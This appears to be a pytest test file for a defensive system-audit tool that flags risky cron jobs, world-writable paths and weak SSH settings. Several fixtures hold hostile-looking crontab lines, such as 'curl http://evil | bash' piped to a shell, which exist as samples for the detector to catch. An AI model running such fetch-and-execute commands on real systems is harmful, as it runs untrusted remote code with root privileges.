# tests/test_syscheck.py
# -*- coding: utf-8 -*-
import os
import json
from pathlib import Path

import pytest

# Importa el módulo del proyecto
from sabbat_tools import syscheck


# ------------------------------
# Helpers
# ------------------------------
def write(p: Path, content: str) -> None:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")


def chmod(p: Path, mode: int) -> None:
    os.chmod(p, mode)


# ------------------------------
# CRON parser robusto (modo clásico)
# ------------------------------
def test_cron_parser_system_and_user(tmp_path: Path, monkeypatch) -> None:
    # Simula /etc/crontab (system-style) y crontab de usuario (user-style)
    etc_crontab = tmp_path / "etc" / "crontab"
    cron_d = tmp_path / "etc" / "cron.d"
    user_spool = tmp_path / "var" / "spool" / "cron" / "crontabs"

    # Entradas válidas
    sys_lines = """
# m h dom mon dow user cmd
5 * * * * root /usr/local/bin/backup.sh
@daily root /usr/local/bin/rotate-logs.sh
# No debería generar ruido:
SHELL=/bin/sh
PATH=/usr/local:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
""".strip()

    # Entradas peligrosas/relativas
    user_lines = """
# m h dom mon dow cmd
15 3 * * * /tmp/evil.sh
0 1 * * * myscript --flag  # relativo → MEDIUM
""".strip()

    write(etc_crontab, sys_lines)
    write(user_spool / "alice", user_lines)

    # world-writable script
    ww_script = tmp_path / "usr" / "local" / "bin" / "worldw.sh"
    write(ww_script, "#!/bin/sh\nexit 0\n")
    chmod(ww_script, 0o777)

    # Añade referencia a script world-writable en cron.d
    cron_d_job = f"0 2 * * * root {ww_script} --ok\n"
    write(cron_d / "job", cron_d_job)

    # Apunta las rutas del módulo a nuestro tmp
    monkeypatch.setattr(syscheck, "CRON_PATHS", [etc_crontab, cron_d, user_spool])

    findings = syscheck.check_cron(lang="en")

    msgs = [
        (f.risk, f.module, f.path, f.recommendation_key, f.message_en) for f in findings
    ]

    # Debe detectar /tmp → HIGH
    assert any("/tmp/evil.sh" in m[4] and m[0] == "HIGH" for m in msgs)

    # Debe detectar relativo "myscript" → MEDIUM
    assert any("relative path: myscript" in m[4] and m[0] == "MEDIUM" for m in msgs)

    # Script world-writable apuntado por cron → HIGH
    assert any("world-writable script" in m[4] and m[0] == "HIGH" for m in msgs)


# ------------------------------
# Permisos: sticky 1777 reduce ruido
# ------------------------------
def test_perms_sticky_dir_is_info(tmp_path: Path) -> None:
    # Directorio estilo /tmp con sticky bit 1777 → debería ser INFO
    tmp_like = tmp_path / "var" / "tmp"
    tmp_like.mkdir(parents=True)
    chmod(tmp_like, 0o1777)

    findings = syscheck.check_perms(
        lang="en",
        roots=[tmp_path],
        excludes=[],
        max_files=1000,
        max_depth=5,
    )

    # Hay un world-writable directory, pero con sticky → INFO
    ww_dirs = [f for f in findings if f.module == "perms" and "directory" in f.message_en]
    assert ww_dirs, "Expected to find at least one world-writable directory"
    assert all(f.risk in {"INFO", "MEDIUM"} for f in ww_dirs)
    assert any(f.risk == "INFO" for f in ww_dirs)


# ------------------------------
# SSH: parseo simple de opciones
# ------------------------------
def test_ssh_basic_findings(tmp_path: Path, monkeypatch) -> None:
    ssh_conf = tmp_path / "etc" / "ssh" / "sshd_config"
    write(
        ssh_conf,
        """
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords no
X11Forwarding yes
MaxAuthTries 10
""".strip(),
    )

    monkeypatch.setattr(syscheck, "SSH_PATH", ssh_conf)
    findings = syscheck.check_ssh(lang="en")

    keys = [f.recommendation_key for f in findings]
    assert "ssh_permit_root_yes" in keys
    assert "ssh_password_auth_yes" in keys
    assert "ssh_x11_forwarding" in keys
    assert "ssh_maxauthtries" in keys


# ------------------------------
# Salidas raw/jsonl y agrupación
# ------------------------------
def test_output_raw_and_jsonl(tmp_path: Path, monkeypatch, capsys) -> None:
    # Prepara un cron con relativo para generar al menos un finding
    crontab = tmp_path / "crontab"
    write(crontab, "0 1 * * * relativecmd --opt\n")
    monkeypatch.setattr(syscheck, "CRON_PATHS", [crontab])

    findings = syscheck.check_cron(lang="en")

    # RAW TSV
    syscheck.print_raw(findings, lang="en", jsonl=False)
    out = capsys.readouterr().out
    assert "relativecmd" in out
    assert out.count("\t") >= 3  # columnas TSV

    # JSONL
    syscheck.print_raw(findings, lang="en", jsonl=True)
    out_lines = capsys.readouterr().out.strip().splitlines()
    assert out_lines and all(json.loads(line).get("module") == "cron" for line in out_lines)


# ------------------------------
# Agrupación humana: mismo mensaje = un grupo
# ------------------------------
def test_grouping(tmp_path: Path, monkeypatch, capsys) -> None:
    crontab = tmp_path / "crontab"
    write(crontab, "\n".join([
        "0 1 * * * rel1",
        "0 2 * * * rel2",
        "0 3 * * * rel3",
    ]))
    monkeypatch.setattr(syscheck, "CRON_PATHS", [crontab])

    findings = syscheck.check_cron(lang="en")
    syscheck.print_human(findings, lang="en", group=True, group_show=2)
    out = capsys.readouterr().out
    # Debe mostrar un único bloque con (count: 3)
    assert "(count: 3)" in out or "(nº: 3)" in out


# ==========================================================================
#                       PRUEBAS PARA EL SUBCOMANDO CRONAUDIT
# ==========================================================================

def test_cronaudit_help_lists_subcommand() -> None:
    """El parser principal debe listar el subcomando 'cronaudit' en la ayuda."""
    parser = syscheck.build_parser()
    help_txt = parser.format_help()
    assert "cronaudit" in help_txt


def test_cronaudit_parse_env_and_dangerous() -> None:
    """_ca_parse_crontab debe detectar variables sin default y patrones peligrosos."""
    text = "*/10 * * * * root curl http://evil | bash\n" \
           "0 2 * * * root /usr/bin/echo $SECRET ${TOKEN}\n"
    fs = list(syscheck._ca_parse_crontab(text, source="/etc/crontab", default_user=None))
    assert len(fs) == 2
    codes0 = [i.code for i in fs[0].issues]
    codes1 = [i.code for i in fs[1].issues]
    assert "cmd.dangerous_pattern" in codes0
    assert "env.unsanitized" in codes1
    assert set(fs[1].env_vars) >= {"SECRET", "TOKEN"}


def test_cronaudit_filtering_logic() -> None:
    """_ca_filter_findings debe aplicar --user, --pattern y --check-dangerous correctamente."""
    CAIssue = syscheck.CAIssue
    CAFinding = syscheck.CAFinding
    mk = lambda cmd, user="root", issues=None: CAFinding(
        kind="cron", id="x", source="src", schedule="*", user=user,
        command=cmd, raw=cmd, exists_user=True, command_resolves=True, absolute_cmd=True,
        issues=issues or []
    )
    args = type("Args", (), {"user": "root", "pattern": "wget", "check_dangerous": False,
                             "check_privileges": False, "only": "all"})
    keep = syscheck._ca_filter_findings([
        mk("/usr/bin/wget http://x"), mk("/usr/bin/echo ok", user="www")
    ], args)
    assert len(keep) == 1 and "wget" in keep[0].command

    args = type("Args", (), {"user": None, "pattern": None, "check_dangerous": True,
                             "check_privileges": False, "only": "all"})
    f1 = mk("curl http://bad | bash", issues=[CAIssue("cmd.dangerous_pattern", "...", "critical")])
    f2 = mk("/usr/bin/echo ok")
    keep = syscheck._ca_filter_findings([f1, f2], args)
    assert keep == [f1]


def test_cronaudit_systemd_iter(monkeypatch) -> None:
    """Simula systemctl para comprobar extracción de ExecStart y usuario."""
    class FakeCompleted:
        def __init__(self, rc, out):
            self.returncode = rc
            self.stdout = out
            self.stderr = ""

    def fake_run(cmd, check, stdout, stderr, text):
        if cmd[:3] == ["systemctl", "list-timers", "--all"]:
            s = "Wed 2025-10-01 00:00:00 UTC  2d left   n/a  n/a  myjob.timer  myjob.service\n"
            return FakeCompleted(0, s)
        if cmd[:2] == ["systemctl", "show"]:
            unit = cmd[2]
            if unit.endswith(".timer"):
                return FakeCompleted(0, "User=\nNextElapseUSecRealtime=Wed 2025-10-01 00:00:00 UTC\n")
            if unit.endswith(".service"):
                return FakeCompleted(0, "User=root\nExecStart={ path=/usr/bin/echo ; argv[]=/usr/bin/echo hello }\n")
        return FakeCompleted(1, "")

    monkeypatch.setattr(syscheck.subprocess, "run", fake_run)
    timers = list(syscheck._ca_iter_systemd_findings())
    assert len(timers) == 1
    f = timers[0]
    assert f.kind == "timer"
    assert f.user == "root"
    assert "echo hello" in f.command


def test_cronaudit_json_output_minimal(monkeypatch, capsys) -> None:
    """cronaudit_main --json debe producir un JSON con campos clave (ts, host, module, findings)."""
    # Evita tocar el sistema: monkeypatch de fuentes para devolver un único finding sintético
    CAFinding = syscheck.CAFinding
    def fake_system_files():
        yield (Path("/etc/crontab"), "*/5 * * * * root /usr/bin/echo hi\n")

    def fake_user_crontabs():
        return []
        yield  # pragma: no cover

    def fake_timers():
        return []

    monkeypatch.setattr(syscheck, "_ca_iter_system_cron_files", fake_system_files)
    monkeypatch.setattr(syscheck, "_ca_iter_user_crontabs", fake_user_crontabs)
    monkeypatch.setattr(syscheck, "_ca_iter_systemd_findings", fake_timers)

    rc = syscheck.cronaudit_main(["--json"])
    out = capsys.readouterr().out
    assert rc in (0, 2)
    data = json.loads(out)
    assert data["module"] == "cronaudit"
    assert isinstance(data["findings"], list)
    # Debe incluir al menos un elemento de findings por la entrada sintética
    assert len(data["findings"]) >= 1

